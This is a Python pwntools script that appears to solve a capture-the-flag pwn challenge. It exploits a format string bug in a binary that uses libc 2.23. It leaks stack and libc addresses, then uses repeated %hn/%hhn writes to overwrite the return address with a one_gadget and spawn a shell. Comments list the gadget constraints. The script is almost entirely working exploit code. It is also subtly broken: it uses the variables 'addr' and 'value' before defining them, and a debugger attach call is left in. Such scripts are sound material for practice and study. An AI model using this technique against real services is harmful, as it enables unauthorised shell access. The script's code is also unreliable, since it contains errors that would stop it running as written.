from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])
# context(log_level='debug')

# io=remote("node4.buuoj.cn",25718)
io=process("./pwn")
elf=ELF("./pwn")
libc=ELF("./libc-2.23.so")

def sd(cc):
    io.sendlineafter(b"what's your favourite food: ", cc)


io.recvuntil(b"Give me your name:")
payload=b"/bin/sh\x00"
io.sendline(payload)


io.recvuntil(b"what's your favourite food: ")
payload="%11$p.%9$p"
io.sendline(payload)

gdb.attach(io)    
pause()

io.recvuntil(b"like ")
stack=int(io.recv(14),16)
stack0=stack-0xd0
ret_addr=stack0-0x10
rr=stack0+0xe0
# canary=int(io.recv(18),16)
io.recvuntil(b".")
libc_addr=int(io.recv(14),16)-240-libc.sym[b"__libc_start_main"]
print("stack: "+hex(stack))
print("stack0: "+hex(stack0))
print("libc_addr: "+hex(libc_addr))
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[3]+libc_addr
sys_addr=libc.sym[b"system"]+libc_addr

off0=(stack0-0x24)&0xffff
payload = "%{}c%{}$hn".format(off0,11)
sd(payload)

sd('%100'+'c%37$hhn') #修改i值，增加循环次数

# off1=(off0+0xc+0x8)
off1=ret_addr

payload = "%{}c%{}$hn".format(addr&0xffff,11)
sd(payload)

payload="%{}c%{}$hhn".format(value&0xff,37)
sd(payload)

def fmt_off(addr,value):

    for i in range(4):
        # payload = "%{}c%{}$hhn".format((addr+1+i)&0xff,11)
        # sd(payload)
        payload="%{}c%{}$hhn".format((value>>((i+1)*8))&0xff,37)
        sd(payload)
    
fmt_off(ret_addr,shell) #单字节循环写

for i in range(87):
    io.sendline(b"1")


io.interactive()
    
# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL